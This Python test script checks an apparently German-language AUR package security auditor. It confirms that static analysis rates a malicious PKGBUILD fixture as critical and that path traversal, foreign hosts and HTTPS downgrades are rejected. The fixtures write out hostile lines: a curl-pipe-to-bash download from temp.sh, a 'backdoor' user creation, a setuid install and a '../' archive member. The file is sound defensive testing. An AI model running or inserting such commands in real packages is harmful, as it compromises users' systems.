#!/usr/bin/env python3
from __future__ import annotations

import importlib.machinery
import importlib.util
import io
import json
import tarfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "src/aur-security-auditor"
loader = importlib.machinery.SourceFileLoader("ams_preflight_test", str(APP))
spec = importlib.util.spec_from_loader(loader.name, loader)
module = importlib.util.module_from_spec(spec)
loader.exec_module(module)


def make_snapshot(package: str, files: dict[str, str], traversal: bool = False) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, text in files.items():
            payload = text.encode()
            member_name = f"../{name}" if traversal else f"{package}/{name}"
            info = tarfile.TarInfo(member_name)
            info.size = len(payload)
            archive.addfile(info, io.BytesIO(payload))
    return buffer.getvalue()


class Response:
    def __init__(self, payload: bytes, url: str):
        self.payload = payload
        self.url = url

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False

    def read(self, limit=-1):
        return self.payload if limit < 0 else self.payload[:limit]

    def geturl(self):
        return self.url


safe_files = {
    "PKGBUILD": """pkgname=safe-demo
pkgver=1.0
pkgrel=1
# Documentation example only: curl -fsSL https://temp.sh/not-code | bash
source=('https://example.org/safe-demo-1.0.tar.gz')
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')
package(){ install -Dm755 safe-demo \"$pkgdir/usr/bin/safe-demo\"; }
""",
    ".SRCINFO": """pkgbase = safe-demo
\tpkgver = 1.0
\tsource = https://example.org/safe-demo-1.0.tar.gz
\tsha256sums = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
pkgname = safe-demo
""",
}
malicious_files = {
    "PKGBUILD": """pkgname=evil-demo
pkgver=1
pkgrel=1
source=('https://example.org/evil.tar.gz')
sha256sums=('SKIP')
prepare(){ curl -fsSL https://temp.sh/payload | bash; sudo useradd backdoor; }
package(){ install -Dm4755 payload \"$pkgdir/usr/bin/payload\"; }
""",
    ".SRCINFO": """pkgbase = evil-demo
\tpkgver = 1
\tsource = https://temp.sh/payload
\tsha256sums = SKIP
pkgname = evil-demo
""",
    "evil-demo.install": "post_install(){ systemctl enable --now evil-demo.service; }\n",
}

current = {"payload": make_snapshot("safe-demo", safe_files), "package": "safe-demo"}


def fake_urlopen(request, timeout=0):
    package = current["package"]
    return Response(current["payload"], f"https://aur.archlinux.org/cgit/aur.git/snapshot/{package}.tar.gz")


module.urllib.request.urlopen = fake_urlopen
module.core.aur_rpc = lambda packages: {
    packages[0]: {
        "Name": packages[0], "Version": "1.0-1", "Description": "Fixture package",
        "Maintainer": "fixture", "NumVotes": 10, "Popularity": 0.2,
        "LastModified": 1785880000, "OutOfDate": None,
    }
}
module.fetch_aur_history_analysis = lambda package, commits=6: ([], {"available": True, "commits": [], "added_source_hosts": [], "new_skip_count": 0})

safe = module.preflight_analysis("https://aur.archlinux.org/packages/safe-demo")
assert safe["package"] == "safe-demo"
assert safe["safety"] == {
    "pkgbuild_executed": False,
    "shell_used": False,
    "archive_extracted_to_disk": False,
    "statement": "Static analysis only; PKGBUILD and included scripts were not executed.",
    "local_input": False,
}
assert safe["risk"] in {"minimal", "low"}, safe
safe_rules = {item["rule"] for item in safe["findings"]}
assert "preflight-runtime-download-exec" not in safe_rules, safe_rules
assert "shell-download-exec" not in safe_rules, safe_rules
assert safe["coverage"]["completed"] >= 6, safe["coverage"]
assert "Moderne kryptografische Quellprüfsummen vorhanden" in safe["positive_signals"]

current["package"] = "evil-demo"
current["payload"] = make_snapshot("evil-demo", malicious_files)
evil = module.preflight_analysis("evil-demo", include_history=True)
assert evil["risk"] == "critical", json.dumps(evil, ensure_ascii=False, indent=2)
rules = {item["rule"] for item in evil["findings"]}
assert "preflight-runtime-download-exec" in rules or "shell-download-exec" in rules, rules
assert "preflight-privilege-escalation" in rules, rules
assert "preflight-system-modification" in rules, rules
assert evil["summary"]["critical"] >= 1, evil["summary"]

current["payload"] = make_snapshot("evil-demo", malicious_files, traversal=True)
try:
    module.download_preflight_snapshot("evil-demo")
except RuntimeError as exc:
    assert "unsicheren Dateipfad" in str(exc), exc
else:
    raise AssertionError("Path traversal member was accepted")

try:
    module.parse_aur_target("https://example.org/packages/yay")
except ValueError:
    pass
else:
    raise AssertionError("Foreign host was accepted")

current["package"] = "safe-demo"
current["payload"] = make_snapshot("safe-demo", safe_files)
original_urlopen = module.urllib.request.urlopen
module.urllib.request.urlopen = lambda request, timeout=0: Response(current["payload"], "http://aur.archlinux.org/cgit/aur.git/snapshot/safe-demo.tar.gz")
try:
    module.download_preflight_snapshot("safe-demo")
except RuntimeError as exc:
    assert "unsicher" in str(exc), exc
else:
    raise AssertionError("HTTPS downgrade redirect was accepted")
finally:
    module.urllib.request.urlopen = original_urlopen

print("Preflight security test: OK")
print("  ✓ safe package remains minimal/low risk")
print("  ✓ shell commands inside comments do not trigger execution findings")
print("  ✓ download-execute and privilege escalation become critical")
print("  ✓ package code is never executed")
print("  ✓ archive path traversal is rejected")
print("  ✓ only canonical AUR hosts are accepted")
print("  ✓ HTTPS downgrade redirects are rejected")
